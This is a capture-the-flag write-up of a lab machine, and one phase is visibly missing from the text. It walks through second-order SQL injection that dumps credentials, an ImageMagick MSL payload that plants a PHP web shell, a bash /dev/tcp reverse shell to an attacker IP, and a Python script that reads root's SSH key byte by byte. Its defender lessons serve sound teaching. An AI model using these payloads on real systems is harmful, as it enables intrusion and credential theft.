<h2 id="attack-chain">Attack chain</h2>
<p>The attack path follows application data flows and trust boundaries.</p>
<h3 id="enumeration-before-exploitation">Enumeration Before Exploitation</h3>
<p>Map the attack surface, application logic, and trust boundaries before testing assumptions.</p>
<h3 id="follow-the-data">Follow the Data</h3>
<p>Web applications are fundamentally about data flow. Ask yourself at every step:</p>
<ul>
<li>Where does my input go?</li>
<li>When is it processed?</li>
<li>Who processes it?</li>
<li>What assumptions does the developer make about this data?</li>
</ul>
<h3 id="second-order-effects">Second-order effects</h3>
<p>Most beginners look for immediate feedback. They input a single quote and expect an error instantly. <strong>Second-order vulnerabilities</strong> teach us patience - sometimes your payload is stored, sanitized, forgotten... and then dangerously reused elsewhere.</p>
<h3 id="when-plans-fail-debug-systematically">When Plans Fail, Debug Systematically</h3>
<p>Our ImageMagick exploit initially failed. Rather than guessing, we tested the simplest possible authenticated request first. This isolated the problem: missing session cookies. <strong>Methodical debugging beats random guessing.</strong></p>

<h2 id="phase-3-discovering-the-sql-injection">Phase 3: Discovering the SQL Injection</h2>
<h3 id="step-3-1-testing-for-injection">Step 3.1: Testing for Injection</h3>
<p>We tried setting Favorite Genres to: <code>food'</code></p>
<p><strong>Result:</strong> The profile saved successfully, but "Your Feed" returned a <strong>500 Internal Server Error</strong>.</p>
<p><strong>Why this is significant:</strong></p>
<ul>
<li>The save operation worked (the profile accepted the quote)</li>
<li>The error only appeared when the data was <strong>retrieved and used</strong> in a query</li>
<li>This confirms a <strong>second-order SQL injection</strong></li>
</ul>


<h3 id="step-3-2-understanding-the-query-structure">Step 3.2: Understanding the Query Structure</h3>
<p>We hypothesized the backend query looked like:</p>
<pre tabindex="0" aria-label="sql code or terminal block 3"><code class="language-sql" data-language="sql">SELECT * FROM images WHERE genre IN ('food', 'travel', 'nature')
</code></pre>
<p>To inject successfully, we need to:</p>
<ol>
<li>Close the opening parenthesis and quote: <code>')</code></li>
<li>Add our malicious SQL</li>
<li>Comment out the rest with <code>#</code></li>
</ol>
<p>We also discovered that <strong>spaces break the query</strong> (likely filtered or split somewhere), so we used MySQL comment syntax <code>/**/</code> as a space substitute.</p>
<h3 id="step-3-3-confirming-injection">Step 3.3: Confirming Injection</h3>
<p><strong>Payload:</strong> <code>food')/**/or/**/1=1#</code></p>
<p><strong>Result:</strong> "Your Feed" showed <strong>ALL</strong> images from every genre.</p>

<h2 id="phase-4-exploiting-second-order-sqli">Phase 4: Exploiting Second-Order SQLi</h2>
<h3 id="step-4-1-determining-column-count">Step 4.1: Determining Column Count</h3>
<p><strong>Payload:</strong> <code>')/**/UNION/**/SELECT/**/1,2,3,4,5#</code></p>
<p><strong>Result:</strong> Success! We saw one image with:</p>
<ul>
<li><code>id</code>: 1</li>
<li><code>file</code>: 2</li>
<li><code>genre</code>: 3</li>
<li><code>created_at</code>: timestamp</li>
<li><code>updated_at</code>: timestamp</li>
</ul>
<p><strong>Why UNION SELECT needs exact columns:</strong>
SQL requires UNION statements to have the same number of columns as the original query. If we guess wrong, we get a column mismatch error.</p>
<h3 id="step-4-2-database-enumeration">Step 4.2: Database Enumeration</h3>
<p>We used the <code>genre</code> column (position 3) to exfiltrate data since it accepts strings.</p>
<p><strong>Get database name:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 4"><code>')/**/UNION/**/SELECT/**/1,2,database(),4,5#
</code></pre>
<p>Result: <code>intentions</code></p>
<p><strong>Get table names:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 5"><code>')/**/UNION/**/SELECT/**/1,2,table_name,4,5/**/from/**/information_schema.tables/**/where/**/table_schema='intentions'#
</code></pre>
<p><strong>Result:</strong> We found the <code>users</code> table.</p>
<h3 id="step-4-3-dumping-user-credentials">Step 4.3: Dumping User Credentials</h3>
<p><strong>Final Payload:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 6"><code>')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password),4,5/**/from/**/users#
</code></pre>
<p><strong>Result:</strong> We extracted all users including admins:</p>
<pre tabindex="0" aria-label="Code or terminal block 7"><code>steve:steve@intentions.htb:1:REDACTED_PASSWORD_HASH
greg:greg@intentions.htb:1:$2y$10$REDACTED_ENCODED_LAB_MATERIAL
</code></pre>
<p><strong>Key Observations:</strong></p>
<ul>
<li><code>admin=1</code> indicates admin privileges</li>
<li>Passwords are bcrypt hashes (<code>$2y$10$...</code>)</li>
<li>Bcrypt is computationally expensive to crack - brute-forcing would take days/weeks</li>

<h2 id="phase-5-admin-access-via-v2-api">Phase 5: Admin Access via v2 API</h2>
<h3 id="step-5-1-discovering-the-v2-login-endpoint">Step 5.1: Discovering the v2 Login Endpoint</h3>
<p>Exploring JavaScript files (specifically <code>admin.js</code>) revealed that a <strong>v2 API</strong> exists with client-side password hashing. The v2 login uses <code>email</code> and <code>hash</code> instead of <code>password</code>.</p>
<p><strong>Why this exists:</strong>
The developers mistakenly believed that sending bcrypt hashes instead of plaintext passwords was "more secure" - not realizing that <strong>if you have the hash, you have the password</strong> from the server's perspective.</p>
<h3 id="step-5-2-authenticating-as-steve">Step 5.2: Authenticating as Steve</h3>
<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.11.89/api/v2/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"steve@intentions.htb","hash":"REDACTED_PASSWORD_HASH"}'
</code></pre>
<p><strong>Result:</strong> We received a JWT token.</p>


<h3 id="step-5-3-establishing-a-session">Step 5.3: Establishing a Session</h3>
<p><strong>The Problem:</strong> The JWT token alone wasn't enough for web/API access. The application also required session cookies (<code>intentions_session</code>, <code>XSRF-TOKEN</code>).</p>
<p><strong>Solution:</strong> We established a full session by:</p>
<ol>
<li>Visiting the homepage to get base cookies</li>
<li>Sending those cookies during v2 login</li>
<li>Saving the resulting cookie jar</li>
</ol>
<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">curl -s -c /tmp/htb_cookies.txt http://10.129.11.89/ &gt; /dev/null
curl -s -i -X POST http://10.129.11.89/api/v2/auth/login \
  -H "Content-Type: application/json" \
  -b /tmp/htb_cookies.txt \
  -c /tmp/htb_cookies.txt \
  -d '{"email":"steve@intentions.htb","hash":"$2y$10$..."}'
</code></pre>

<h2 id="phase-6-imagemagick-rce-msl-exploit">Phase 6: ImageMagick RCE (MSL Exploit)</h2>
<h3 id="step-6-1-discovering-the-admin-feature">Step 6.1: Discovering the Admin Feature</h3>
<p>As admin, we accessed <code>/admin</code> and found an image editing feature. Clicking "Edit" on an image showed effect buttons (CHARCOAL, etc.).</p>
<p><strong>The API call:</strong></p>
<pre tabindex="0" aria-label="json code or terminal block 10"><code class="language-json" data-language="json">POST /api/v2/admin/image/modify
{"path":"/var/www/html/intentions/storage/app/public/food/rod-long--LMw-y4gxac-unsplash.jpg","effect":"charcoal"}
</code></pre>


<h3 id="step-6-2-identifying-imagemagick">Step 6.2: Identifying ImageMagick</h3>
<p>We confirmed ImageMagick by:</p>
<ol>
<li>Testing <code>path[100x100]</code> : worked (resized)</li>
<li>Testing <code>path[]</code> : failed</li>
<li>Testing <code>path[10x10]</code> : worked (tiny image)</li>
</ol>
<p>This bracket syntax is <strong>unique to ImageMagick</strong>.</p>
<h3 id="step-6-3-understanding-the-vulnerability">Step 6.3: Understanding the Vulnerability</h3>
<p>ImageMagick's PHP extension (<code>Imagick</code>) allows <strong>arbitrary object instantiation</strong>. When you pass a specially crafted path to <code>new Imagick()</code>, it can:</p>
<ul>
<li>Read from URLs (<code>http://</code>, <code>ftp://</code>)</li>
<li>Process MSL (Magick Scripting Language) files</li>
<li>Write files to arbitrary locations</li>
</ul>
<p><strong>The MSL format</strong> is an XML-based scripting language for ImageMagick that can:</p>
<ul>
<li>Read images (including from URLs)</li>
<li>Write images (to arbitrary paths)</li>
<li>Embed PHP code in captions</li>
</ul>
<h3 id="step-6-4-the-exploit-chain">Step 6.4: The Exploit Chain</h3>
<p><strong>Problem:</strong> We can't directly upload an MSL file and reference it because <code>msl:/http://attacker/</code> isn't supported.</p>
<p><strong>Solution:</strong> We abuse PHP's temporary file handling:</p>
<ol>
<li>Send a multipart POST request with the MSL file as an attachment</li>
<li>PHP saves it to <code>/tmp/phpXXXXXX</code> (random suffix)</li>
<li>Use the <code>vid:</code> scheme with wildcards: <code>vid:msl:/tmp/php*</code></li>
<li>ImageMagick's <code>ExpandFilenames</code> finds the temp file via wildcard matching</li>
</ol>
<h3 id="step-6-5-creating-the-payload">Step 6.5: Creating the Payload</h3>
<pre tabindex="0" aria-label="xml code or terminal block 11"><code class="language-xml" data-language="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;image&gt;
&lt;read filename="caption:&amp;lt;?php system($_REQUEST['cmd']); ?&amp;gt;" /&gt;
&lt;write filename="info:/var/www/html/intentions/storage/app/public/shell.php" /&gt;
&lt;/image&gt;
</code></pre>
<p><strong>Mechanism:</strong></p>
<ul>
<li><code>caption:</code> creates an image containing the text <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></li>
<li><code>info:</code> writes image metadata/info to the specified path</li>
<li>The resulting file contains PHP code that executes when accessed via the web server</li>
<li>The <code>caption:</code> text before the PHP tag appears in output (hence the <code>caption:</code> prefix we saw)</li>
</ul>
<h3 id="step-6-6-executing-the-exploit">Step 6.6: Executing the Exploit</h3>
<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">curl -X POST "http://10.129.11.89/api/v2/admin/image/modify?path=vid:msl:/tmp/php*&amp;effect=abcd" \
  -b /tmp/htb_cookies.txt \
  -F 'file=@/tmp/shell.msl;filename=test.msl'
</code></pre>
<p><strong>Result:</strong> 502 Bad Gateway (ImageMagick crashed processing the MSL - this is expected and means success)</p>
<p><strong>Verification:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">curl -s "http://10.129.11.89/storage/shell.php?cmd=id"
# Output: caption:uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>

<h2 id="phase-7-shell-as-www-data">Phase 7: Shell as www-data</h2>
<h3 id="step-7-1-getting-the-reverse-shell">Step 7.1: Getting the Reverse Shell</h3>
<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">nc -lnvp 443  # On Kali

curl -s "http://10.129.11.89/storage/shell.php" \
  -d 'cmd=bash -c "bash -i &gt;%26 /dev/tcp/10.10.16.84/443 0&gt;%261"'
</code></pre>
<p><strong>Critical detail:</strong> The <code>%26</code> is URL-encoded <code>&amp;</code>. Without this, PHP's <code>system()</code> would receive a broken command because <code>&amp;</code> is a form data delimiter.</p>
<p><strong>Result:</strong> We caught a shell as <code>www-data</code>.</p>
<h3 id="step-7-2-upgrading-the-shell">Step 7.2: Upgrading the Shell</h3>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash"># In the reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
</code></pre>
<p><strong>Why upgrade?</strong> A basic netcat shell lacks job control, proper signal handling, and TTY features. A pseudo-TTY gives us a more stable interactive environment.</p>

</code></pre>

<h2 id="phase-9-privilege-escalation-to-root">Phase 9: Privilege Escalation to root</h2>
<h3 id="step-9-1-enumeration-as-greg">Step 9.1: Enumeration as greg</h3>
<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">sudo -l  # No sudo access
find / -perm -4000 -or -perm -2000 2&gt;/dev/null  # No unusual SUID binaries
getcap -r / 2&gt;/dev/null
</code></pre>
<p><strong>Critical Discovery:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 21"><code>/opt/scanner/scanner cap_dac_read_search=ep
</code></pre>
<p><strong>What <code>cap_dac_read_search=ep</code> means:</strong>
This Linux capability allows the binary to <strong>bypass all file read permission checks</strong>. It can read <code>/root/.ssh/id_rsa</code>, <code>/etc/shadow</code>, or any file regardless of ownership or permissions.</p>


<h3 id="step-9-2-understanding-the-scanner-binary">Step 9.2: Understanding the Scanner Binary</h3>
<p>The scanner computes MD5 hashes of files and compares them against a blacklist. The key flag is <code>-l</code>:</p>
<pre tabindex="0" aria-label="Code or terminal block 22"><code>-l int  Maximum bytes of files being checked to hash (default 500)
</code></pre>
<p>With <code>-p</code> (print debug), it reveals the hash of the first N bytes.</p>
<h3 id="step-9-3-the-brute-force-strategy">Step 9.3: The Brute-Force Strategy</h3>
<p><strong>The Insight:</strong>
If we know the MD5 hash of the first byte of a file, we can brute-force all 256 possible byte values to find the match. Then we do the same for the first 2 bytes, 3 bytes, etc.</p>
<p><strong>Mechanism:</strong></p>
<ul>
<li>MD5 is deterministic: same input = same hash</li>
<li>We can control the length with <code>-l</code></li>
<li>We can read any file with the capability</li>
</ul>
<h3 id="step-9-4-the-exploit-script">Step 9.4: The Exploit Script</h3>
<pre tabindex="0" aria-label="python code or terminal block 23"><code class="language-python" data-language="python">#!/usr/bin/env python3
import hashlib
import subprocess
import sys

def get_hash(fn, n):
    proc = subprocess.run(f"/opt/scanner/scanner -c {fn} -s whatever -p -l {n}".split(),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        return proc.stdout.decode().strip().split()[-1]
    except IndexError:
        return None

def get_next_char(output, target):
    for i in range(256):
        if target == hashlib.md5(output + chr(i).encode()).hexdigest():
            return chr(i).encode()

output = b""
fn = sys.argv[1]

while True:
    target = get_hash(fn, len(output) + 1)
    next_char = get_next_char(output, target)
    if next_char is None:
        break
    output += next_char
    print(next_char.decode(), end="", flush=True)

print()
</code></pre>
<h3 id="step-9-5-reading-root-s-ssh-key">Step 9.5: Reading root's SSH Key</h3>
<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">python3 /tmp/read_file.py /root/.ssh/id_rsa
</code></pre>
<p><strong>Result:</strong> After several minutes of brute-forcing byte-by-byte, we recovered the complete private key.</p>

<blockquote>
<p>"This is a 'lame' exploit in the best way possible. No memory corruption, no fancy technique - just abusing the intended functionality of a privileged binary. When you have arbitrary read, the game is over. I chose <code>/root/.ssh/id_rsa</code> because it's the cleanest, most reliable persistence method."</p>
</blockquote>
<h3 id="step-9-6-ssh-as-root">Step 9.6: SSH as root</h3>
<p>On Kali, we saved the key to <code>root_key</code>, set proper permissions, and connected:</p>
<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">chmod 600 root_key
ssh -i root_key root@10.129.11.89
</code></pre>
<p><strong>Result:</strong> Root shell achieved.</p>

<h2 id="lessons-learned">Lessons Learned</h2>
<h3 id="for-attackers">For Attackers</h3>
<ol>
<li><strong>Second-order vulnerabilities</strong> require patience. Test inputs in all contexts where stored data is reused.</li>
<li><strong>Hashes are passwords.</strong> Do not assume hashed credentials are safe to expose.</li>
<li><strong>Capabilities are privileges.</strong> Check <code>getcap</code> during Linux enumeration.</li>
<li><strong>Git history is sensitive.</strong> Do not commit credentials, but also Check <code>.git</code> in target environments.</li>
<li><strong>Debug systematically.</strong> When the MSL exploit failed, we tested a simple authenticated request first to isolate the auth issue.</li>
</ol>
<h3 id="for-defenders">For Defenders</h3>
<ol>
<li><strong>Parameterize ALL queries.</strong> The SQLi existed because the genres string was concatenated into a SELECT statement while INSERTs were likely parameterized.</li>
<li><strong>Don't accept hashes as passwords.</strong> Client-side hashing doesn't improve security if the server accepts the hash.</li>
<li><strong>Sanitize file paths rigorously.</strong> Do not pass user-controlled paths directly to image processing libraries.</li>
<li><strong>Audit capabilities.</strong> <code>cap_dac_read_search</code> on a user-accessible binary is equivalent to giving away root's reading ability.</li>
<li><strong>Scrub Git history.</strong> Use <code>git filter-repo</code> or BFG to permanently remove secrets from history.</li>
</ol>
